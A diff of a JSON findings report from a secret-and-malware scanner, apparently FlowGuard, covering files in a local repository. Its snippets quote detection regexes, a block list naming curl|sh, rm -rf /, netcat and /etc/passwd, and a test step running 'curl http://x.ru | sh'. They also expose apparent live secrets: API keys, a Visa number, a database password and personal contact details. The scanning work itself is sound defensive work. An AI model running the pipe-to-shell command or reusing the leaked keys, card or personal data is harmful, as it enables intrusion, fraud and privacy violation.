@@ -1,6 +1,491 @@
 {
   "files": [
     {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\agent\\rules.js",
+      "size": 20115,
+      "ext": ".js",
+      "findings": [
+        {
+          "level": "CRITICAL",
+          "reason": "curl|sh — pipe to shell",
+          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
+          "line": 80,
+          "snippet": "{ level: 'CRITICAL', re: /curl[^\\n]*\\|\\s*(ba)?sh/i,             reason: 'curl|sh — pipe to shell (RCE pattern)' },"
+        },
+        {
+          "level": "HIGH",
+          "reason": "TOR .onion address",
+          "explain": "A TOR hidden service address was found. Why is this code connecting to an anonymous network?",
+          "line": 98,
+          "snippet": "{ level: 'CRITICAL', re: /\\.onion/i,                              reason: 'TOR .onion address' },"
+        },
+        {
+          "level": "HIGH",
+          "reason": "ngrok tunnel",
+          "explain": "ngrok creates a public tunnel directly to your machine. This can expose internal services to the internet.",
+          "line": 97,
+          "snippet": "{ level: 'HIGH', re: /ngrok/i,                                    reason: 'ngrok — public tunnel' },"
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "Non-HTTPS URL",
+          "explain": "An unencrypted HTTP URL was found. Traffic is sent in plain text and can be intercepted. Use HTTPS instead.",
+          "line": 244,
+          "snippet": "// Drive paths: X:/ or X:\\ — negative lookbehind: not preceded by a letter (avoids http://)"
+        }
+      ],
+      "risk_score": 85,
+      "risk_label": "CRITICAL",
+      "scanned_at": "2026-04-16T21:35:28.711Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\collector\\file-audit-result.json",
+      "size": 275917,
+      "ext": ".json",
+      "findings": [
+        {
+          "level": "CRITICAL",
+          "reason": "Anthropic API key",
+          "explain": "An Anthropic (Claude) API key is exposed. Revoke it immediately at console.anthropic.com.",
+          "line": 30,
+          "snippet": "\"snippet\": \"ANTHROPIC_API_KEY=sk-ant-api03-ILSafb4X2Z9new-qz8yyJJidkF_AHXpTCxB-vQyJoKeL_P9a-sNQZW-uyord_EH2p6XdISN-xAEie"
+        },
+        {
+          "level": "CRITICAL",
+          "reason": "Private key",
+          "explain": "A private SSH/SSL key is stored in code. This is like leaving your server password in plain sight.",
+          "line": 1673,
+          "snippet": "\"snippet\": \"-----BEGIN OPENSSH PRIVATE KEY-----\""
+        },
+        {
+          "level": "CRITICAL",
+          "reason": "curl|sh — pipe to shell",
+          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
+          "line": 112,
+          "snippet": "\"reason\": \"curl|sh — pipe to shell\","
+        },
+        {
+          "level": "HIGH",
+          "reason": "Google API key",
+          "explain": "A Google API key (Maps, Gmail, etc.) is exposed. Could result in unauthorized usage billed to your account.",
+          "line": 316,
+          "snippet": "\"snippet\": \"\\\"snippet\\\": \\\"\\\\\\\"snippet\\\\\\\": \\\\\\\"\\\\\\\\\\\\\\\"snippet\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"const apiKey = \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"AIzaSyDg"
+        },
+        {
+          "level": "HIGH",
+          "reason": "Hardcoded password",
+          "explain": "A password is written directly in the code. Anyone who reads this file can see it.",
+          "line": 323,
+          "snippet": "\"snippet\": \"\\\"snippet\\\": \\\"<div class=\\\\\\\"term-line\\\\\\\"><span class=\\\\\\\"term-out\\\\\\\">  → DB_PASSWORD=prod_secret_2024</s"
+        },
+        {
+          "level": "HIGH",
+          "reason": "Visa card number",
+          "explain": "A Visa credit card number was found. Storing card numbers in code violates PCI-DSS compliance.",
+          "line": 2099,
+          "snippet": "\"snippet\": \"ויזה 4580980102572767\""
+        },
+        {
+          "level": "HIGH",
+          "reason": "TOR .onion address",
+          "explain": "A TOR hidden service address was found. Why is this code connecting to an anonymous network?",
+          "line": 95,
+          "snippet": "\"reason\": \"TOR .onion address\","
+        },
+        {
+          "level": "HIGH",
+          "reason": "ngrok tunnel",
+          "explain": "ngrok creates a public tunnel directly to your machine. This can expose internal services to the internet.",
+          "line": 126,
+          "snippet": "\"reason\": \"ngrok tunnel\","
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 47,
+          "snippet": "\"snippet\": \"מייל: eran73@gmail.com | טלפון: 054-4825276\""
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "eval() call",
+          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
+          "line": 133,
+          "snippet": "\"reason\": \"eval() call\","
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "Non-HTTPS URL",
+          "explain": "An unencrypted HTTP URL was found. Traffic is sent in plain text and can be intercepted. Use HTTPS instead.",
+          "line": 13,
+          "snippet": "\"snippet\": \"-ConnectionUri \\\"http://$ExchangeServer/PowerShell/\\\" `\""
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "TODO/FIXME with credentials",
+          "explain": "A comment marks that a password or secret has not been properly handled yet.",
+          "line": 143,
+          "snippet": "\"snippet\": \"{ level: 'MEDIUM', re: /TODO.*password|FIXME.*secret/i,                 reason: 'TODO/FIXME with credentials"
+        }
+      ],
+      "risk_score": 100,
+      "risk_label": "CRITICAL",
+      "scanned_at": "2026-04-16T21:35:28.718Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\dashboard\\index-v2.html",
+      "size": 143672,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "MEDIUM",
+          "reason": "eval() call",
+          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
+          "line": 2723,
+          "snippet": "{ icon: '🔍', text: '<strong>22 Patterns</strong> — API Keys, סיסמאות, URL לא מאובטח, TOR addresses, eval(), base64|sh ו"
+        }
+      ],
+      "risk_score": 5,
+      "risk_label": "MEDIUM",
+      "scanned_at": "2026-04-16T21:35:28.738Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\docs\\user-guide-en.html",
+      "size": 47634,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "CRITICAL",
+          "reason": "curl|sh — pipe to shell",
+          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
+          "line": 305,
+          "snippet": "Claude Code runs a <code>curl | bash</code> command late at night, downloading a script from the internet and executing "
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 941,
+          "snippet": "<div style=\"margin-top:4px;\">054-4825276</div>"
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "eval() call",
+          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
+          "line": 365,
+          "snippet": "<tr><td><span class=\"badge medium\">MEDIUM</span></td><td>Suspicious — worth reviewing</td><td>HTTP (not HTTPS), eval(), "
+        }
+      ],
+      "risk_score": 50,
+      "risk_label": "CRITICAL",
+      "scanned_at": "2026-04-16T21:35:28.755Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\docs\\user-guide.html",
+      "size": 50007,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "CRITICAL",
+          "reason": "curl|sh — pipe to shell",
+          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
+          "line": 303,
+          "snippet": "Claude Code מריץ בשעות הלילה פקודת <code>curl | bash</code> שמורידה סקריפט מהאינטרנט ומריצה אותו. FlowGuard מזהה את זה ו"
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 939,
+          "snippet": "<div style=\"margin-top:4px;\">054-4825276</div>"
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "eval() call",
+          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
+          "line": 363,
+          "snippet": "<tr><td><span class=\"badge medium\">MEDIUM</span></td><td>מפוקפק — כדאי לבדוק</td><td>HTTP (לא HTTPS), eval(), טלפון ישרא"
+        }
+      ],
+      "risk_score": 50,
+      "risk_label": "CRITICAL",
+      "scanned_at": "2026-04-16T21:35:28.760Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\install\\setup.ps1",
+      "size": 10765,
+      "ext": ".ps1",
+      "findings": [
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 40,
+          "snippet": "Write-Host \"  by EHZ-AI | 054-4825276\" -ForegroundColor DarkGray"
+        }
+      ],
+      "risk_score": 5,
+      "risk_label": "MEDIUM",
+      "scanned_at": "2026-04-16T21:35:28.764Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\install\\uninstall.ps1",
+      "size": 10717,
+      "ext": ".ps1",
+      "findings": [
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 34,
+          "snippet": "Write-Host \"  by EHZ-AI | 054-4825276\" -ForegroundColor DarkGray"
+        }
+      ],
+      "risk_score": 5,
+      "risk_label": "MEDIUM",
+      "scanned_at": "2026-04-16T21:35:28.765Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\package.json",
+      "size": 810,
+      "ext": ".json",
+      "findings": [
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 24,
+          "snippet": "\"author\": \"EHZ-AI | ערן | 054-4825276\","
+        }
+      ],
+      "risk_score": 5,
+      "risk_label": "MEDIUM",
+      "scanned_at": "2026-04-16T21:35:28.772Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\workplan.html",
+      "size": 285907,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "CRITICAL",
+          "reason": "curl|sh — pipe to shell",
+          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
+          "line": 604,
+          "snippet": "<div class=\"task-desc\">curl|sh, rm -rf /, base64, netcat, /etc/passwd — CRITICAL/HIGH.</div>"
+        },
+        {
+          "level": "HIGH",
+          "reason": "Hardcoded password",
+          "explain": "A password is written directly in the code. Anyone who reads this file can see it.",
+          "line": 856,
+          "snippet": "<b>דוגמה:</b> password=Ehz2026! / sk-ant-api03-... / מספר כרטיס אשראי → התראה מיידית לפני שהקובץ מגיע ל-Git.<br>"
+        },
+        {
+          "level": "HIGH",
+          "reason": "Visa card number",
+          "explain": "A Visa credit card number was found. Storing card numbers in code violates PCI-DSS compliance.",
+          "line": 4615,
+          "snippet": "<td><code style=\"background:#1e293b;color:#e2e8f0;padding:3px 8px;border-radius:4px;font-size:11px;border-left:3px solid"
+        },
+        {
+          "level": "HIGH",
+          "reason": "TOR .onion address",
+          "explain": "A TOR hidden service address was found. Why is this code connecting to an anonymous network?",
+          "line": 811,
+          "snippet": "<div class=\"task-desc\">כרטיסי Visa + Amex, מספרי פלאפון ישראלי, eval(), Non-HTTPS URL, .onion, ngrok. בוצע: 08.04.2026</"
+        },
+        {
+          "level": "HIGH",
+          "reason": "ngrok tunnel",
+          "explain": "ngrok creates a public tunnel directly to your machine. This can expose internal services to the internet.",
+          "line": 610,
+          "snippet": "<div class=\"task-desc\">WebFetch IP/TLD, Write ל-.ssh/etc, HTTP במקום HTTPS, ngrok.</div>"
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 4269,
+          "snippet": "<div>EHZ-AI | ערן | 054-4825276</div>"
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "eval() call",
+          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
+          "line": 811,
+          "snippet": "<div class=\"task-desc\">כרטיסי Visa + Amex, מספרי פלאפון ישראלי, eval(), Non-HTTPS URL, .onion, ngrok. בוצע: 08.04.2026</"
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "Non-HTTPS URL",
+          "explain": "An unencrypted HTTP URL was found. Traffic is sent in plain text and can be intercepted. Use HTTPS instead.",
+          "line": 628,
+          "snippet": "<span style=\"color:var(--muted2);\"> הרץ <code style=\"color:#7dd3fc;\">curl http://x.ru | sh</code> → קבל CRITICAL alert →"
+        }
+      ],
+      "risk_score": 100,
+      "risk_label": "CRITICAL",
+      "scanned_at": "2026-04-16T21:35:28.773Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\football-bot\\COACH-GUIDE.html",
+      "size": 15009,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 391,
+          "snippet": "הוכן ע\"י <span class=\"ehz\">EHZ-AI</span> · 054-4825276"
+        }
+      ],
+      "risk_score": 5,
+      "risk_label": "MEDIUM",
+      "scanned_at": "2026-04-16T21:35:28.786Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\football-bot\\index.js",
+      "size": 16158,
+      "ext": ".js",
+      "findings": [
+        {
+          "level": "MEDIUM",
+          "reason": "Non-HTTPS URL",
+          "explain": "An unencrypted HTTP URL was found. Traffic is sent in plain text and can be intercepted. Use HTTPS instead.",
+          "line": 177,
+          "snippet": "console.log('✅ QR זמין: http://ehz-server1.duckdns.org/whatsapp-qr.html');"
+        }
+      ],
+      "risk_score": 5,
+      "risk_label": "MEDIUM",
+      "scanned_at": "2026-04-16T21:35:28.794Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\football-bot\\public\\index.html",
+      "size": 24962,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 317,
+          "snippet": "<input type=\"text\" id=\"s-coach-phone\" placeholder=\"0501234567\" dir=\"ltr\" style=\"text-align:left\">"
+        }
+      ],
+      "risk_score": 5,
+      "risk_label": "MEDIUM",
+      "scanned_at": "2026-04-16T21:35:28.797Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\football-bot\\public\\login.html",
+      "size": 6091,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "HIGH",
+          "reason": "Hardcoded password",
+          "explain": "A password is written directly in the code. Anyone who reads this file can see it.",
+          "line": 196,
+          "snippet": "const password = document.getElementById('password').value;"
+        }
+      ],
+      "risk_score": 20,
+      "risk_label": "HIGH",
+      "scanned_at": "2026-04-16T21:35:28.800Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\agents\\football-bot\\WORKPLAN.html",
+      "size": 60885,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 1244,
+          "snippet": "Football Bot — Workplan v0.1 | הוכן ע\"י EHZ-AI | 054-4825276"
+        }
+      ],
+      "risk_score": 5,
+      "risk_label": "MEDIUM",
+      "scanned_at": "2026-04-16T21:35:28.801Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\local-apps\\flowguard-site\\index.html",
+      "size": 58699,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "CRITICAL",
+          "reason": "curl|sh — pipe to shell",
+          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
+          "line": 415,
+          "snippet": "<div style=\"font-size:13px; color:var(--muted2);\"><span class=\"en\">Claude Code runs a <code style=\"color:var(--accent);\""
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 793,
+          "snippet": "<div class=\"footer-right\">© 2026 EHZ-AI · Built by Eran Hershkowitz · 054-4825276</div>"
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "eval() call",
+          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
+          "line": 493,
+          "snippet": "<tr style=\"border-top:1px solid rgba(26,45,74,0.5);\"><td style=\"padding:13px 24px;\"><span style=\"background:#eab308;colo"
+        }
+      ],
+      "risk_score": 50,
+      "risk_label": "CRITICAL",
+      "scanned_at": "2026-04-16T21:35:28.854Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\local-apps\\flowguard-site\\troubleshoot.html",
+      "size": 8687,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 200,
+          "snippet": "<div class=\"contact-row\">📱 Phone/WhatsApp: <a href=\"tel:+972544825276\">054-4825276</a></div>"
+        }
+      ],
+      "risk_score": 5,
+      "risk_label": "MEDIUM",
+      "scanned_at": "2026-04-16T21:35:28.860Z"
+    },
+    {
+      "path": "C:\\Claude-Repo\\research\\chatbot-workplan\\whatsapp-football-bot.html",
+      "size": 19322,
+      "ext": ".html",
+      "findings": [
+        {
+          "level": "HIGH",
+          "reason": "ngrok tunnel",
+          "explain": "ngrok creates a public tunnel directly to your machine. This can expose internal services to the internet.",
+          "line": 353,
+          "snippet": "<div class=\"stack-val\">ngrok</div>"
+        },
+        {
+          "level": "MEDIUM",
+          "reason": "Israeli phone number",
+          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
+          "line": 533,
+          "snippet": "הוכן ע\"י EHZ-AI | 054-4825276"
+        }
+      ],
+      "risk_score": 25,
+      "risk_label": "HIGH",
+      "scanned_at": "2026-04-16T21:35:29.680Z"
+    },
+    {
       "path": "C:\\Claude-Repo\\agents\\agent\\collectors\\Get-ExchangeHealth.ps1",
       "size": 9962,
       "ext": ".ps1",
@@ -148,44 +633,6 @@
       "scanned_at": "2026-04-15T12:56:02.480Z"
     },
     {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\agent\\rules.js",
-      "size": 20007,
-      "ext": ".js",
-      "findings": [
-        {
-          "level": "CRITICAL",
-          "reason": "curl|sh — pipe to shell",
-          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
-          "line": 80,
-          "snippet": "{ level: 'CRITICAL', re: /curl[^\\n]*\\|\\s*(ba)?sh/i,             reason: 'curl|sh — pipe to shell (RCE pattern)' },"
-        },
-        {
-          "level": "HIGH",
-          "reason": "TOR .onion address",
-          "explain": "A TOR hidden service address was found. Why is this code connecting to an anonymous network?",
-          "line": 98,
-          "snippet": "{ level: 'CRITICAL', re: /\\.onion/i,                              reason: 'TOR .onion address' },"
-        },
-        {
-          "level": "HIGH",
-          "reason": "ngrok tunnel",
-          "explain": "ngrok creates a public tunnel directly to your machine. This can expose internal services to the internet.",
-          "line": 97,
-          "snippet": "{ level: 'HIGH', re: /ngrok/i,                                    reason: 'ngrok — public tunnel' },"
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "Non-HTTPS URL",
-          "explain": "An unencrypted HTTP URL was found. Traffic is sent in plain text and can be intercepted. Use HTTPS instead.",
-          "line": 244,
-          "snippet": "// Drive paths: X:/ or X:\\ — negative lookbehind: not preceded by a letter (avoids http://)"
-        }
-      ],
-      "risk_score": 85,
-      "risk_label": "CRITICAL",
-      "scanned_at": "2026-04-15T12:56:02.485Z"
-    },
-    {
       "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\agent\\skill-scanner.js",
       "size": 7153,
       "ext": ".js",
@@ -297,79 +744,6 @@
       "scanned_at": "2026-04-15T12:56:02.491Z"
     },
     {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\collector\\file-audit-result.json",
-      "size": 257596,
-      "ext": ".json",
-      "findings": [
-        {
-          "level": "CRITICAL",
-          "reason": "curl|sh — pipe to shell",
-          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
-          "line": 61,
-          "snippet": "\"reason\": \"curl|sh — pipe to shell\","
-        },
-        {
-          "level": "HIGH",
-          "reason": "Google API key",
-          "explain": "A Google API key (Maps, Gmail, etc.) is exposed. Could result in unauthorized usage billed to your account.",
-          "line": 265,
-          "snippet": "\"snippet\": \"\\\"snippet\\\": \\\"\\\\\\\"snippet\\\\\\\": \\\\\\\"const apiKey = \\\\\\\\\\\\\\\"AIzaSyDgE1uIgllMhSls6QTjSk5ofSjCyezMQ6s\\\\\\\\\\\\\\\";\\"
-        },
-        {
-          "level": "HIGH",
-          "reason": "Hardcoded password",
-          "explain": "A password is written directly in the code. Anyone who reads this file can see it.",
-          "line": 625,
-          "snippet": "\"snippet\": \"<div class=\\\"term-line\\\"><span class=\\\"term-out\\\">  → DB_PASSWORD=prod_secret_2024</span></div>\""
-        },
-        {
-          "level": "HIGH",
-          "reason": "TOR .onion address",
-          "explain": "A TOR hidden service address was found. Why is this code connecting to an anonymous network?",
-          "line": 44,
-          "snippet": "\"reason\": \"TOR .onion address\","
-        },
-        {
-          "level": "HIGH",
-          "reason": "ngrok tunnel",
-          "explain": "ngrok creates a public tunnel directly to your machine. This can expose internal services to the internet.",
-          "line": 75,
-          "snippet": "\"reason\": \"ngrok tunnel\","
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "Israeli phone number",
-          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
-          "line": 30,
-          "snippet": "\"snippet\": \"מייל: eran73@gmail.com | טלפון: 054-4825276\""
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "eval() call",
-          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
-          "line": 82,
-          "snippet": "\"reason\": \"eval() call\","
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "Non-HTTPS URL",
-          "explain": "An unencrypted HTTP URL was found. Traffic is sent in plain text and can be intercepted. Use HTTPS instead.",
-          "line": 13,
-          "snippet": "\"snippet\": \"-ConnectionUri \\\"http://$ExchangeServer/PowerShell/\\\" `\""
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "TODO/FIXME with credentials",
-          "explain": "A comment marks that a password or secret has not been properly handled yet.",
-          "line": 92,
-          "snippet": "\"snippet\": \"{ level: 'MEDIUM', re: /TODO.*password|FIXME.*secret/i,                 reason: 'TODO/FIXME with credentials"
-        }
-      ],
-      "risk_score": 100,
-      "risk_label": "CRITICAL",
-      "scanned_at": "2026-04-15T12:56:02.510Z"
-    },
-    {
       "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\dashboard\\index-backup.html",
       "size": 142109,
       "ext": ".html",
@@ -385,30 +759,6 @@
       "risk_score": 5,
       "risk_label": "MEDIUM",
       "scanned_at": "2026-04-15T12:56:02.543Z"
-    },
-    {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\dashboard\\index-v2.html",
-      "size": 138580,
-      "ext": ".html",
-      "findings": [
-        {
-          "level": "MEDIUM",
-          "reason": "Israeli phone number",
-          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
-          "line": 1312,
-          "snippet": "<span style=\"font-size:11px;\">054-4825276</span>"
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "eval() call",
-          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
-          "line": 2622,
-          "snippet": "{ icon: '🔍', text: '<strong>22 Patterns</strong> — API Keys, סיסמאות, URL לא מאובטח, TOR addresses, eval(), base64|sh ו"
-        }
-      ],
-      "risk_score": 10,
-      "risk_label": "MEDIUM",
-      "scanned_at": "2026-04-15T12:56:02.557Z"
     },
     {
       "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\dashboard\\index.html",
@@ -469,68 +819,6 @@
       "scanned_at": "2026-04-15T12:56:02.587Z"
     },
     {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\docs\\user-guide-en.html",
-      "size": 44035,
-      "ext": ".html",
-      "findings": [
-        {
-          "level": "CRITICAL",
-          "reason": "curl|sh — pipe to shell",
-          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
-          "line": 305,
-          "snippet": "Claude Code runs a <code>curl | bash</code> command late at night, downloading a script from the internet and executing "
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "Israeli phone number",
-          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
-          "line": 899,
-          "snippet": "<div style=\"margin-top:4px;\">054-4825276</div>"
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "eval() call",
-          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
-          "line": 365,
-          "snippet": "<tr><td><span class=\"badge medium\">MEDIUM</span></td><td>Suspicious — worth reviewing</td><td>HTTP (not HTTPS), eval(), "
-        }
-      ],
-      "risk_score": 50,
-      "risk_label": "CRITICAL",
-      "scanned_at": "2026-04-15T12:56:02.589Z"
-    },
-    {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\docs\\user-guide.html",
-      "size": 46080,
-      "ext": ".html",
-      "findings": [
-        {
-          "level": "CRITICAL",
-          "reason": "curl|sh — pipe to shell",
-          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
-          "line": 303,
-          "snippet": "Claude Code מריץ בשעות הלילה פקודת <code>curl | bash</code> שמורידה סקריפט מהאינטרנט ומריצה אותו. FlowGuard מזהה את זה ו"
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "Israeli phone number",
-          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
-          "line": 897,
-          "snippet": "<div style=\"margin-top:4px;\">054-4825276</div>"
-        },
-        {
-          "level": "MEDIUM",
-          "reason": "eval() call",
-          "explain": "eval() executes a string as code at runtime. This can allow arbitrary code execution if the input is not trusted.",
-          "line": 363,
-          "snippet": "<tr><td><span class=\"badge medium\">MEDIUM</span></td><td>מפוקפק — כדאי לבדוק</td><td>HTTP (לא HTTPS), eval(), טלפון ישרא"
-        }
-      ],
-      "risk_score": 50,
-      "risk_label": "CRITICAL",
-      "scanned_at": "2026-04-15T12:56:02.597Z"
-    },
-    {
       "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\gap-analysis.html",
       "size": 36805,
       "ext": ".html",
@@ -560,40 +848,6 @@
       "risk_score": 65,
       "risk_label": "CRITICAL",
       "scanned_at": "2026-04-15T12:56:02.603Z"
-    },
-    {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\install\\setup.ps1",
-      "size": 10757,
-      "ext": ".ps1",
-      "findings": [
-        {
-          "level": "MEDIUM",
-          "reason": "Israeli phone number",
-          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
-          "line": 40,
-          "snippet": "Write-Host \"  by EHZ-AI | 054-4825276\" -ForegroundColor DarkGray"
-        }
-      ],
-      "risk_score": 5,
-      "risk_label": "MEDIUM",
-      "scanned_at": "2026-04-15T12:56:02.610Z"
-    },
-    {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\install\\uninstall.ps1",
-      "size": 9540,
-      "ext": ".ps1",
-      "findings": [
-        {
-          "level": "MEDIUM",
-          "reason": "Israeli phone number",
-          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
-          "line": 34,
-          "snippet": "Write-Host \"  by EHZ-AI | 054-4825276\" -ForegroundColor DarkGray"
-        }
-      ],
-      "risk_score": 5,
-      "risk_label": "MEDIUM",
-      "scanned_at": "2026-04-15T12:56:02.613Z"
     },
     {
       "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\marketing\\flowguard-logo-v2.html",
@@ -732,23 +986,6 @@
       "scanned_at": "2026-04-15T12:56:02.685Z"
     },
     {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\package.json",
-      "size": 810,
-      "ext": ".json",
-      "findings": [
-        {
-          "level": "MEDIUM",
-          "reason": "Israeli phone number",
-          "explain": "An Israeli phone number was found in the code. Check if this is personal data that should not be here.",
-          "line": 24,
-          "snippet": "\"author\": \"EHZ-AI | ערן | 054-4825276\","
-        }
-      ],
-      "risk_score": 5,
-      "risk_label": "MEDIUM",
-      "scanned_at": "2026-04-15T12:56:02.699Z"
-    },
-    {
       "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\README.md",
       "size": 484,
       "ext": ".md",
@@ -781,82 +1018,6 @@
       "risk_score": 5,
       "risk_label": "MEDIUM",
       "scanned_at": "2026-04-15T12:56:02.704Z"
-    },
-    {
-      "path": "C:\\Claude-Repo\\agents\\EHZ-SEC-AI\\workplan.html",
-      "size": 252994,
-      "ext": ".html",
-      "findings": [
-        {
-          "level": "CRITICAL",
-          "reason": "curl|sh — pipe to shell",
-          "explain": "Code downloads a script from the internet and runs it immediately — a classic malware delivery technique.",
-          "line": 598,
-          "snippet": "<div class=\"task-desc\">curl|sh, rm -rf /, base64, netcat, /etc/passwd — CRITICAL/HIGH.</div>"
-        },
-        {
-          "level": "HIGH",
-          "reason": "Hardcoded password",
-          "explain": "A password is written directly in the code. Anyone who reads this file can see it.",
-          "line": 850,
-          "snippet": "<b>דוגמה:</b> password=Ehz2026! / sk-ant-api03-... / מספר כרטיס אשראי → התראה מיידית לפני שהקובץ מגיע ל-Git.<br>"
-        },
-        {
-          "level": "HIGH",
-          "reason": "TOR .onion address",
-          "explain": "A TOR hidden service address was found. Why is this code connecting to an anonymous network?",
-          "line": 805,
